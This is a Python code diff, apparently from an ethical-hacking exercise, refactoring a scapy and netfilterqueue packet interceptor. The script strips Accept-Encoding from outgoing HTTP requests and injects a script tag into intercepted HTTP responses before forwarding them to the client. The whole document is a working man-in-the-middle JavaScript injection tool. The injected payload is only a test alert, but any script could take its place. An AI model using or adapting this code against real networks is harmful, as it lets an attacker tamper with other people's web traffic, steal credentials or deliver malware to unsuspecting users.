@@ -14,16 +14,19 @@ def set_load(packet, load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # This will convert the packet payload to scapy packet
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            print("[+]Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+]Response")
-            modified_load = scapy_packet[scapy.Raw].load.replace("<body>", "<body><script>alert('Test')</script>")
-            new_packet = set_load(scapy_packet, modified_load)
+            load = load.replace("<body>", "<body><script>alert('Test')</script>")  # replacing body tag with body and script tag to inject javascript code.
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
             packet.set_payload(str(new_packet))
+
     packet.accept()  # This will accept the packet and forward it to the client computer allowing him to go that particular website
 
 
